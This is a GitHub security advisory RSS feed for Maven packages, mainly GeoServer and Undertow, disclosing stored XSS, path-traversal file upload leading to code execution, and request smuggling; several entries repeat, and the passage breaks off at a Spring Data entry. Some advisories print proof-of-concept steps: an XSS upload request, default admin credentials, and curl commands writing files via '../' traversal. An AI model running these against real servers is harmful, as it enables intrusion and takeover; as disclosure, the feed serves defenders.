<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://azu.github.io/github-advisory-database-rss/maven.rss</id>
    <title>Security Advisory for Java artifacts hosted at the Maven central repository</title>
    <updated>2024-03-20T15:01:13.008Z</updated>
    <generator>github-advisory-database-rss</generator>
    <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Amaven"/>
    <subtitle>Security Advisory for Java artifacts hosted at the Maven central repository on GitHub</subtitle>
    <rights>github-advisory-database-rss</rights>
    <category term="CRITICAL"/>
    <category term="HIGH"/>
    <category term="MODERATE"/>
    <category term="LOW"/>
    <entry>
        <title type="html"><![CDATA[[org.geoserver:gs-restconfig] Stored Cross-Site Scripting (XSS) vulnerability in REST Resources API]]></title>
        <id>https://github.com/advisories/GHSA-fh7p-5f6g-vj2w</id>
        <link href="https://github.com/advisories/GHSA-fh7p-5f6g-vj2w"/>
        <updated>2024-03-20T14:58:24.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>A stored cross-site scripting (XSS) vulnerability exists that enables an authenticated administrator with workspace-level privileges to store a JavaScript payload in uploaded style/legend resources that will execute in the context of another administrator's browser when viewed in the REST Resources API.  Access to the REST Resources API is limited to full administrators by default and granting non-administrators access to this endpoint should be carefully considered as it may allow access to files containing sensitive information.</p>
<h3 id="details">Details</h3>
<p>Upload a new Legend via the New Style page if user has permissions for this. This file is then not checked and is uploaded to the backend system. This file can then be viewed directly by requesting it via the API which will then view the file in its raw format without sanitisation.
<img alt="image" src="https://user-images.githubusercontent.com/6471928/232732469-7dbf2776-5712-4c68-bd12-e2403c136a7c.png"></p>
<p><img alt="image" src="https://user-images.githubusercontent.com/6471928/232732832-4fe2337f-9b28-41b1-9181-24abff4a6973.png"></p>
<h3 id="poc">PoC</h3>
<p>1 .User makes the following request to upload file.</p>
<pre><code>POST /geoserver/web/wicket/bookmarkable/org.geoserver.wms.web.data.StyleNewPage?11-1.IBehaviorListener.0-dialog-dialog-content-form-submit&amp;wicket-ajax=true&amp;wicket-ajax-baseurl=wicket%2Fbookmarkable%2Forg.geoserver.wms.web.data.StyleNewPage%3F11 HTTP/1.1
Host: geoserver:8080
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=---------------------------37957706701641834739220342753
Content-Length: 619
Connection: close
Upgrade-Insecure-Requests: 1

-----------------------------37957706701641834739220342753
Content-Disposition: form-data; name="id89_hf_0"
-----------------------------37957706701641834739220342753
Content-Disposition: form-data; name="userPanel:image"
-----------------------------37957706701641834739220342753
Content-Disposition: form-data; name="userPanel:upload"; filename="test.html"
Content-Type: text/html
&lt;script&gt;alert(document.cookie)&lt;/script&gt;
-----------------------------37957706701641834739220342753
Content-Disposition: form-data; name="p::submit"
1
-----------------------------37957706701641834739220342753--
</code></pre>
<ol start="2">
<li><p>File is uploaded to the backend system and is viewable via the API at - /geoserver/rest/resourse/styles as per the screenshot above.</p>
</li>
<li><p>If admin user views this file the Javascript is executed and this could be used to craft a payload to steal the user's cookies(as these do not currently use HTTPOnly)
<img alt="image" src="https://user-images.githubusercontent.com/6471928/232733694-5a994b08-53e4-4cd0-a20e-ec8717537e26.png"></p>
</li>
</ol>
<p>Alternatively -</p>
<p>If the user has permissions to use the API to make PUT requests then they can directly upload malicious files as per a request below. This would be viewable in the same way as above.</p>
<p>PUT /geoserver/rest/resource/styles/test2.html HTTP/1.1
Host: geoserver:8080
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,<em>/</em>;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Authorization: Basic YWRtaW46Z2Vvc2VydmVy (admin:geoserver default credentials)
Connection: close
Upgrade-Insecure-Requests: 1
Content-Type: text/html
Content-Length: 29</p>



<h3 id="impact">Impact</h3>
<p>If an attacker can control a script that is executed in the victim's browser, then they can typically fully compromise that user. Amongst other things, the attacker can:</p>
<p>1 .Perform any action within the application that the user can perform.
2. View any information that the user is able to view.
3. Modify any information that the user is able to modify.
4. Initiate interactions with other application users, including malicious attacks, that will appear to originate from the initial victim user.</p>
<h3 id="references">References</h3>
<p><a href="https://osgeo-org.atlassian.net/browse/GEOS-11148">https://osgeo-org.atlassian.net/browse/GEOS-11148</a>
<a href="https://github.com/geoserver/geoserver/pull/7161">https://github.com/geoserver/geoserver/pull/7161</a></p>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/geoserver/geoserver/security/advisories/GHSA-fh7p-5f6g-vj2w">https://github.com/geoserver/geoserver/security/advisories/GHSA-fh7p-5f6g-vj2w</a></li>
<li><a href="https://github.com/geoserver/geoserver/pull/7161">https://github.com/geoserver/geoserver/pull/7161</a></li>
<li><a href="https://github.com/geoserver/geoserver/commit/7db985738ff2422019ccac974cf547bae5770cad">https://github.com/geoserver/geoserver/commit/7db985738ff2422019ccac974cf547bae5770cad</a></li>
<li><a href="https://osgeo-org.atlassian.net/browse/GEOS-11148">https://osgeo-org.atlassian.net/browse/GEOS-11148</a></li>
<li><a href="https://github.com/advisories/GHSA-fh7p-5f6g-vj2w">https://github.com/advisories/GHSA-fh7p-5f6g-vj2w</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-fh7p-5f6g-vj2w</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-03-20T14:58:17.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[org.geoserver:gs-restconfig] Arbitrary file upload vulnerability in REST Coverage Store API]]></title>
        <id>https://github.com/advisories/GHSA-9v5q-2gwq-q9hq</id>
        <link href="https://github.com/advisories/GHSA-9v5q-2gwq-q9hq"/>
        <updated>2024-03-20T14:55:00.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>An arbitrary file upload vulnerability exists that enables an authenticated administrator with permissions to modify coverage stores through the REST Coverage Store API to upload arbitrary file contents to arbitrary file locations which can lead to remote code execution.</p>
<h3 id="details">Details</h3>
<p>Coverage stores that are configured using relative paths use a GeoServer Resource implementation that has validation to prevent path traversal but coverage stores that are configured using absolute paths use a different Resource implementation that does not prevent path traversal.</p>
<h3 id="poc">PoC</h3>
<p>Step 1 (create sample coverage store):
curl -vXPUT -H"Content-type:application/zip" -u"admin:geoserver" --data-binary @polyphemus.zip "<a href="http://localhost:8080/geoserver/rest/workspaces/sf/coveragestores/filewrite/file.imagemosaic">http://localhost:8080/geoserver/rest/workspaces/sf/coveragestores/filewrite/file.imagemosaic</a>"
Step 2 (switch store to absolute URL):
curl -vXPUT -H"Content-Type:application/xml" -u"admin:geoserver" -d"file:///{absolute path to data directory}/data/sf/filewrite" "<a href="http://localhost:8080/geoserver/rest/workspaces/sf/coveragestores/filewrite">http://localhost:8080/geoserver/rest/workspaces/sf/coveragestores/filewrite</a>"
Step 3 (upload arbitrary files):
curl -vH"Content-Type:" -u"admin:geoserver" --data-binary @file/to/upload "<a href="http://localhost:8080/geoserver/rest/workspaces/sf/coveragestores/filewrite/file.a?filename=../../../../../../../../../../file/to/write">http://localhost:8080/geoserver/rest/workspaces/sf/coveragestores/filewrite/file.a?filename=../../../../../../../../../../file/to/write</a>"
Steps 1 &amp; 2 can be combined into a single POST REST call if local write access to anywhere on the the file system that GeoServer can read is possible (e.g., the /tmp directory).</p>
<h3 id="impact">Impact</h3>
<p>This vulnerability can lead to executing arbitrary code.  An administrator with limited privileges could also potentially exploit this to overwrite GeoServer security files and obtain full administrator privileges.</p>
<h3 id="references">References</h3>
<p><a href="https://osgeo-org.atlassian.net/browse/GEOS-11176">https://osgeo-org.atlassian.net/browse/GEOS-11176</a>
<a href="https://github.com/geoserver/geoserver/pull/7222">https://github.com/geoserver/geoserver/pull/7222</a></p>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/geoserver/geoserver/security/advisories/GHSA-9v5q-2gwq-q9hq">https://github.com/geoserver/geoserver/security/advisories/GHSA-9v5q-2gwq-q9hq</a></li>
<li><a href="https://github.com/geoserver/geoserver/pull/7222">https://github.com/geoserver/geoserver/pull/7222</a></li>
<li><a href="https://github.com/geoserver/geoserver/commit/ca683170c669718cb6ad4c79e01b0451065e13b8">https://github.com/geoserver/geoserver/commit/ca683170c669718cb6ad4c79e01b0451065e13b8</a></li>
<li><a href="https://github.com/geoserver/geoserver/commit/fe235b3bb1d7f05751a4a2ef5390c36f5c9e78ae">https://github.com/geoserver/geoserver/commit/fe235b3bb1d7f05751a4a2ef5390c36f5c9e78ae</a></li>
<li><a href="https://osgeo-org.atlassian.net/browse/GEOS-11176">https://osgeo-org.atlassian.net/browse/GEOS-11176</a></li>
<li><a href="https://github.com/advisories/GHSA-9v5q-2gwq-q9hq">https://github.com/advisories/GHSA-9v5q-2gwq-q9hq</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-9v5q-2gwq-q9hq</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-03-20T14:54:59.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[org.geoserver:gs-platform] Arbitrary file upload vulnerability in REST Coverage Store API]]></title>
        <id>https://github.com/advisories/GHSA-9v5q-2gwq-q9hq</id>
        <link href="https://github.com/advisories/GHSA-9v5q-2gwq-q9hq"/>
        <updated>2024-03-20T14:55:00.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>An arbitrary file upload vulnerability exists that enables an authenticated administrator with permissions to modify coverage stores through the REST Coverage Store API to upload arbitrary file contents to arbitrary file locations which can lead to remote code execution.</p>
<h3 id="details">Details</h3>
<p>Coverage stores that are configured using relative paths use a GeoServer Resource implementation that has validation to prevent path traversal but coverage stores that are configured using absolute paths use a different Resource implementation that does not prevent path traversal.</p>
<h3 id="poc">PoC</h3>
<p>Step 1 (create sample coverage store):
curl -vXPUT -H"Content-type:application/zip" -u"admin:geoserver" --data-binary @polyphemus.zip "<a href="http://localhost:8080/geoserver/rest/workspaces/sf/coveragestores/filewrite/file.imagemosaic">http://localhost:8080/geoserver/rest/workspaces/sf/coveragestores/filewrite/file.imagemosaic</a>"
Step 2 (switch store to absolute URL):
curl -vXPUT -H"Content-Type:application/xml" -u"admin:geoserver" -d"file:///{absolute path to data directory}/data/sf/filewrite" "<a href="http://localhost:8080/geoserver/rest/workspaces/sf/coveragestores/filewrite">http://localhost:8080/geoserver/rest/workspaces/sf/coveragestores/filewrite</a>"
Step 3 (upload arbitrary files):
curl -vH"Content-Type:" -u"admin:geoserver" --data-binary @file/to/upload "<a href="http://localhost:8080/geoserver/rest/workspaces/sf/coveragestores/filewrite/file.a?filename=../../../../../../../../../../file/to/write">http://localhost:8080/geoserver/rest/workspaces/sf/coveragestores/filewrite/file.a?filename=../../../../../../../../../../file/to/write</a>"
Steps 1 &amp; 2 can be combined into a single POST REST call if local write access to anywhere on the the file system that GeoServer can read is possible (e.g., the /tmp directory).</p>
<h3 id="impact">Impact</h3>
<p>This vulnerability can lead to executing arbitrary code.  An administrator with limited privileges could also potentially exploit this to overwrite GeoServer security files and obtain full administrator privileges.</p>
<h3 id="references">References</h3>
<p><a href="https://osgeo-org.atlassian.net/browse/GEOS-11176">https://osgeo-org.atlassian.net/browse/GEOS-11176</a>
<a href="https://github.com/geoserver/geoserver/pull/7222">https://github.com/geoserver/geoserver/pull/7222</a></p>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/geoserver/geoserver/security/advisories/GHSA-9v5q-2gwq-q9hq">https://github.com/geoserver/geoserver/security/advisories/GHSA-9v5q-2gwq-q9hq</a></li>
<li><a href="https://github.com/geoserver/geoserver/pull/7222">https://github.com/geoserver/geoserver/pull/7222</a></li>
<li><a href="https://github.com/geoserver/geoserver/commit/ca683170c669718cb6ad4c79e01b0451065e13b8">https://github.com/geoserver/geoserver/commit/ca683170c669718cb6ad4c79e01b0451065e13b8</a></li>
<li><a href="https://github.com/geoserver/geoserver/commit/fe235b3bb1d7f05751a4a2ef5390c36f5c9e78ae">https://github.com/geoserver/geoserver/commit/fe235b3bb1d7f05751a4a2ef5390c36f5c9e78ae</a></li>
<li><a href="https://osgeo-org.atlassian.net/browse/GEOS-11176">https://osgeo-org.atlassian.net/browse/GEOS-11176</a></li>
<li><a href="https://github.com/advisories/GHSA-9v5q-2gwq-q9hq">https://github.com/advisories/GHSA-9v5q-2gwq-q9hq</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-9v5q-2gwq-q9hq</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-03-20T14:54:59.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[org.geoserver:gs-restconfig] Arbitrary file upload vulnerability in REST Coverage Store API]]></title>
        <id>https://github.com/advisories/GHSA-9v5q-2gwq-q9hq</id>
        <link href="https://github.com/advisories/GHSA-9v5q-2gwq-q9hq"/>
        <updated>2024-03-20T14:55:00.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>An arbitrary file upload vulnerability exists that enables an authenticated administrator with permissions to modify coverage stores through the REST Coverage Store API to upload arbitrary file contents to arbitrary file locations which can lead to remote code execution.</p>
<h3 id="details">Details</h3>
<p>Coverage stores that are configured using relative paths use a GeoServer Resource implementation that has validation to prevent path traversal but coverage stores that are configured using absolute paths use a different Resource implementation that does not prevent path traversal.</p>
<h3 id="poc">PoC</h3>
<p>Step 1 (create sample coverage store):
curl -vXPUT -H"Content-type:application/zip" -u"admin:geoserver" --data-binary @polyphemus.zip "<a href="http://localhost:8080/geoserver/rest/workspaces/sf/coveragestores/filewrite/file.imagemosaic">http://localhost:8080/geoserver/rest/workspaces/sf/coveragestores/filewrite/file.imagemosaic</a>"
Step 2 (switch store to absolute URL):
curl -vXPUT -H"Content-Type:application/xml" -u"admin:geoserver" -d"file:///{absolute path to data directory}/data/sf/filewrite" "<a href="http://localhost:8080/geoserver/rest/workspaces/sf/coveragestores/filewrite">http://localhost:8080/geoserver/rest/workspaces/sf/coveragestores/filewrite</a>"
Step 3 (upload arbitrary files):
curl -vH"Content-Type:" -u"admin:geoserver" --data-binary @file/to/upload "<a href="http://localhost:8080/geoserver/rest/workspaces/sf/coveragestores/filewrite/file.a?filename=../../../../../../../../../../file/to/write">http://localhost:8080/geoserver/rest/workspaces/sf/coveragestores/filewrite/file.a?filename=../../../../../../../../../../file/to/write</a>"
Steps 1 &amp; 2 can be combined into a single POST REST call if local write access to anywhere on the the file system that GeoServer can read is possible (e.g., the /tmp directory).</p>
<h3 id="impact">Impact</h3>
<p>This vulnerability can lead to executing arbitrary code.  An administrator with limited privileges could also potentially exploit this to overwrite GeoServer security files and obtain full administrator privileges.</p>
<h3 id="references">References</h3>
<p><a href="https://osgeo-org.atlassian.net/browse/GEOS-11176">https://osgeo-org.atlassian.net/browse/GEOS-11176</a>
<a href="https://github.com/geoserver/geoserver/pull/7222">https://github.com/geoserver/geoserver/pull/7222</a></p>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/geoserver/geoserver/security/advisories/GHSA-9v5q-2gwq-q9hq">https://github.com/geoserver/geoserver/security/advisories/GHSA-9v5q-2gwq-q9hq</a></li>
<li><a href="https://github.com/geoserver/geoserver/pull/7222">https://github.com/geoserver/geoserver/pull/7222</a></li>
<li><a href="https://github.com/geoserver/geoserver/commit/ca683170c669718cb6ad4c79e01b0451065e13b8">https://github.com/geoserver/geoserver/commit/ca683170c669718cb6ad4c79e01b0451065e13b8</a></li>
<li><a href="https://github.com/geoserver/geoserver/commit/fe235b3bb1d7f05751a4a2ef5390c36f5c9e78ae">https://github.com/geoserver/geoserver/commit/fe235b3bb1d7f05751a4a2ef5390c36f5c9e78ae</a></li>
<li><a href="https://osgeo-org.atlassian.net/browse/GEOS-11176">https://osgeo-org.atlassian.net/browse/GEOS-11176</a></li>
<li><a href="https://github.com/advisories/GHSA-9v5q-2gwq-q9hq">https://github.com/advisories/GHSA-9v5q-2gwq-q9hq</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-9v5q-2gwq-q9hq</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-03-20T14:54:59.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[org.geoserver:gs-platform] Arbitrary file upload vulnerability in REST Coverage Store API]]></title>
        <id>https://github.com/advisories/GHSA-9v5q-2gwq-q9hq</id>
        <link href="https://github.com/advisories/GHSA-9v5q-2gwq-q9hq"/>
        <updated>2024-03-20T14:55:00.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>An arbitrary file upload vulnerability exists that enables an authenticated administrator with permissions to modify coverage stores through the REST Coverage Store API to upload arbitrary file contents to arbitrary file locations which can lead to remote code execution.</p>
<h3 id="details">Details</h3>
<p>Coverage stores that are configured using relative paths use a GeoServer Resource implementation that has validation to prevent path traversal but coverage stores that are configured using absolute paths use a different Resource implementation that does not prevent path traversal.</p>
<h3 id="poc">PoC</h3>
<p>Step 1 (create sample coverage store):
curl -vXPUT -H"Content-type:application/zip" -u"admin:geoserver" --data-binary @polyphemus.zip "<a href="http://localhost:8080/geoserver/rest/workspaces/sf/coveragestores/filewrite/file.imagemosaic">http://localhost:8080/geoserver/rest/workspaces/sf/coveragestores/filewrite/file.imagemosaic</a>"
Step 2 (switch store to absolute URL):
curl -vXPUT -H"Content-Type:application/xml" -u"admin:geoserver" -d"file:///{absolute path to data directory}/data/sf/filewrite" "<a href="http://localhost:8080/geoserver/rest/workspaces/sf/coveragestores/filewrite">http://localhost:8080/geoserver/rest/workspaces/sf/coveragestores/filewrite</a>"
Step 3 (upload arbitrary files):
curl -vH"Content-Type:" -u"admin:geoserver" --data-binary @file/to/upload "<a href="http://localhost:8080/geoserver/rest/workspaces/sf/coveragestores/filewrite/file.a?filename=../../../../../../../../../../file/to/write">http://localhost:8080/geoserver/rest/workspaces/sf/coveragestores/filewrite/file.a?filename=../../../../../../../../../../file/to/write</a>"
Steps 1 &amp; 2 can be combined into a single POST REST call if local write access to anywhere on the the file system that GeoServer can read is possible (e.g., the /tmp directory).</p>
<h3 id="impact">Impact</h3>
<p>This vulnerability can lead to executing arbitrary code.  An administrator with limited privileges could also potentially exploit this to overwrite GeoServer security files and obtain full administrator privileges.</p>
<h3 id="references">References</h3>
<p><a href="https://osgeo-org.atlassian.net/browse/GEOS-11176">https://osgeo-org.atlassian.net/browse/GEOS-11176</a>
<a href="https://github.com/geoserver/geoserver/pull/7222">https://github.com/geoserver/geoserver/pull/7222</a></p>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/geoserver/geoserver/security/advisories/GHSA-9v5q-2gwq-q9hq">https://github.com/geoserver/geoserver/security/advisories/GHSA-9v5q-2gwq-q9hq</a></li>
<li><a href="https://github.com/geoserver/geoserver/pull/7222">https://github.com/geoserver/geoserver/pull/7222</a></li>
<li><a href="https://github.com/geoserver/geoserver/commit/ca683170c669718cb6ad4c79e01b0451065e13b8">https://github.com/geoserver/geoserver/commit/ca683170c669718cb6ad4c79e01b0451065e13b8</a></li>
<li><a href="https://github.com/geoserver/geoserver/commit/fe235b3bb1d7f05751a4a2ef5390c36f5c9e78ae">https://github.com/geoserver/geoserver/commit/fe235b3bb1d7f05751a4a2ef5390c36f5c9e78ae</a></li>
<li><a href="https://osgeo-org.atlassian.net/browse/GEOS-11176">https://osgeo-org.atlassian.net/browse/GEOS-11176</a></li>
<li><a href="https://github.com/advisories/GHSA-9v5q-2gwq-q9hq">https://github.com/advisories/GHSA-9v5q-2gwq-q9hq</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-9v5q-2gwq-q9hq</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-03-20T14:54:59.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[org.geoserver:gs-main] GeoServer log file path traversal vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-8g7v-vjrc-x4g5</id>
        <link href="https://github.com/advisories/GHSA-8g7v-vjrc-x4g5"/>
        <updated>2024-03-20T14:45:21.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>This vulnerability requires GeoServer Administrator with access to the admin console  to misconfigured the <strong>Global Settings</strong> for <strong>log file location</strong> to an arbitrary location.</p>
<p>This can be used to read files via the admin console <strong>GeoServer Logs</strong> page. It is also possible to leverage RCE or cause denial of service by overwriting key GeoServer files.</p>
<h3 id="patches">Patches</h3>
<p>As this issue requires GeoServer administrators access, often representing a trusted party, the vulnerability has not yet attracted a volunteer or resources.</p>
<p>Interested parties are welcome to contact <a href="mailto:geoserver-security@lists.osgeo.org">geoserver-security@lists.osgeo.org</a> for recommendations on developing a fix.</p>
<h3 id="workarounds">Workarounds</h3>
<p>A system administrator responsible for running GeoServer can define  the <code>GEOSERVER_LOG_FILE</code> parameter, preventing the global setting provided from being used.</p>
<p>The <code>GEOSERVER_LOG_LOCATION</code> parameter can be set as system property, environment variable, or servlet context parameter.</p>
<p>Environmental variable:</p>
<pre><code class="language-bash">export GEOSERVER_LOG_LOCATION=/var/opt/geoserver/logs
</code></pre>
<p>System property:</p>
<pre><code class="language-bash">-DGEOSERVER_LOG_LOCATION=/var/opt/geoserver/logs
</code></pre>
<p>Web application <code>WEB-INF/web.xml</code>:</p>
<pre><code class="language-xml">  &lt;context-param&gt;
    &lt;param-name&gt; GEOSERVER_LOG_LOCATION &lt;/param-name&gt;
    &lt;param-value&gt;/var/opt/geoserver/logs&lt;/param-value&gt;
  &lt;/context-param&gt;
</code></pre>
<p>Tomcat <strong>conf/Catalina/localhost/geoserver.xml</strong>:</p>
<pre><code class="language-xml">&lt;Context&gt;
  &lt;Parameter name="GEOSERVER_LOG_LOCATION"
             value="/var/opt/geoserver/logs" override="false"/&gt;
&lt;/Context&gt;
</code></pre>
<h3 id="references">References</h3>
<ul>
<li><a href="https://docs.geoserver.org/latest/en/user/configuration/globalsettings.html#log-location">Log location</a> (User Manual)</li>
</ul>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/geoserver/geoserver/security/advisories/GHSA-8g7v-vjrc-x4g5">https://github.com/geoserver/geoserver/security/advisories/GHSA-8g7v-vjrc-x4g5</a></li>
<li><a href="https://github.com/advisories/GHSA-8g7v-vjrc-x4g5">https://github.com/advisories/GHSA-8g7v-vjrc-x4g5</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-8g7v-vjrc-x4g5</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-03-20T14:45:21.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[io.undertow:undertow-core] Undertow Request Smuggling vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-5gg7-5wv8-4gcj</id>
        <link href="https://github.com/advisories/GHSA-5gg7-5wv8-4gcj"/>
        <updated>2024-03-20T14:32:44.000Z</updated>
        <content type="html"><![CDATA[<p>It was discovered that Undertow before 1.4.17, 1.3.31 and 2.0.0 processes http request headers with unusual whitespaces which can cause possible http request smuggling.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2017-12165">https://nvd.nist.gov/vuln/detail/CVE-2017-12165</a></li>
<li><a href="https://bugzilla.redhat.com/show_bug.cgi?id=CVE-2017-12165">https://bugzilla.redhat.com/show_bug.cgi?id=CVE-2017-12165</a></li>
<li><a href="https://issues.redhat.com/browse/UNDERTOW-1251">https://issues.redhat.com/browse/UNDERTOW-1251</a></li>
<li><a href="https://github.com/undertow-io/undertow/commit/1e72647818c9fb31b693a953b1ae595a6c82eb7f">https://github.com/undertow-io/undertow/commit/1e72647818c9fb31b693a953b1ae595a6c82eb7f</a></li>
<li><a href="https://github.com/undertow-io/undertow/commit/5b008b7ac312c6cdb76679ff58c43620bb79d44f">https://github.com/undertow-io/undertow/commit/5b008b7ac312c6cdb76679ff58c43620bb79d44f</a></li>
<li><a href="https://github.com/undertow-io/undertow/commit/691440ee58259fba76711b60d56dde6679808bdc">https://github.com/undertow-io/undertow/commit/691440ee58259fba76711b60d56dde6679808bdc</a></li>
<li><a href="https://github.com/advisories/GHSA-5gg7-5wv8-4gcj">https://github.com/advisories/GHSA-5gg7-5wv8-4gcj</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-5gg7-5wv8-4gcj</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2022-05-13T01:38:14.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[io.undertow:undertow-core] Undertow Request Smuggling vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-5gg7-5wv8-4gcj</id>
        <link href="https://github.com/advisories/GHSA-5gg7-5wv8-4gcj"/>
        <updated>2024-03-20T14:32:44.000Z</updated>
        <content type="html"><![CDATA[<p>It was discovered that Undertow before 1.4.17, 1.3.31 and 2.0.0 processes http request headers with unusual whitespaces which can cause possible http request smuggling.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2017-12165">https://nvd.nist.gov/vuln/detail/CVE-2017-12165</a></li>
<li><a href="https://bugzilla.redhat.com/show_bug.cgi?id=CVE-2017-12165">https://bugzilla.redhat.com/show_bug.cgi?id=CVE-2017-12165</a></li>
<li><a href="https://issues.redhat.com/browse/UNDERTOW-1251">https://issues.redhat.com/browse/UNDERTOW-1251</a></li>
<li><a href="https://github.com/undertow-io/undertow/commit/1e72647818c9fb31b693a953b1ae595a6c82eb7f">https://github.com/undertow-io/undertow/commit/1e72647818c9fb31b693a953b1ae595a6c82eb7f</a></li>
<li><a href="https://github.com/undertow-io/undertow/commit/5b008b7ac312c6cdb76679ff58c43620bb79d44f">https://github.com/undertow-io/undertow/commit/5b008b7ac312c6cdb76679ff58c43620bb79d44f</a></li>
<li><a href="https://github.com/undertow-io/undertow/commit/691440ee58259fba76711b60d56dde6679808bdc">https://github.com/undertow-io/undertow/commit/691440ee58259fba76711b60d56dde6679808bdc</a></li>
<li><a href="https://github.com/advisories/GHSA-5gg7-5wv8-4gcj">https://github.com/advisories/GHSA-5gg7-5wv8-4gcj</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-5gg7-5wv8-4gcj</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2022-05-13T01:38:14.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[io.undertow:undertow-core] Undertow Request Smuggling vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-5gg7-5wv8-4gcj</id>
        <link href="https://github.com/advisories/GHSA-5gg7-5wv8-4gcj"/>
        <updated>2024-03-20T14:32:44.000Z</updated>
        <content type="html"><![CDATA[<p>It was discovered that Undertow before 1.4.17, 1.3.31 and 2.0.0 processes http request headers with unusual whitespaces which can cause possible http request smuggling.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2017-12165">https://nvd.nist.gov/vuln/detail/CVE-2017-12165</a></li>
<li><a href="https://bugzilla.redhat.com/show_bug.cgi?id=CVE-2017-12165">https://bugzilla.redhat.com/show_bug.cgi?id=CVE-2017-12165</a></li>
<li><a href="https://issues.redhat.com/browse/UNDERTOW-1251">https://issues.redhat.com/browse/UNDERTOW-1251</a></li>
<li><a href="https://github.com/undertow-io/undertow/commit/1e72647818c9fb31b693a953b1ae595a6c82eb7f">https://github.com/undertow-io/undertow/commit/1e72647818c9fb31b693a953b1ae595a6c82eb7f</a></li>
<li><a href="https://github.com/undertow-io/undertow/commit/5b008b7ac312c6cdb76679ff58c43620bb79d44f">https://github.com/undertow-io/undertow/commit/5b008b7ac312c6cdb76679ff58c43620bb79d44f</a></li>
<li><a href="https://github.com/undertow-io/undertow/commit/691440ee58259fba76711b60d56dde6679808bdc">https://github.com/undertow-io/undertow/commit/691440ee58259fba76711b60d56dde6679808bdc</a></li>
<li><a href="https://github.com/advisories/GHSA-5gg7-5wv8-4gcj">https://github.com/advisories/GHSA-5gg7-5wv8-4gcj</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-5gg7-5wv8-4gcj</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2022-05-13T01:38:14.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[org.springframework.data:spring-data-commons] Spring Data Commons remote code injection vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-4fq3-mr56-cg6r</id>
        <link href="https://github.com/advisories/GHSA-4fq3-mr56-cg6r"/>
        <updated>2024-03-20T14:20:44.000Z</updated>
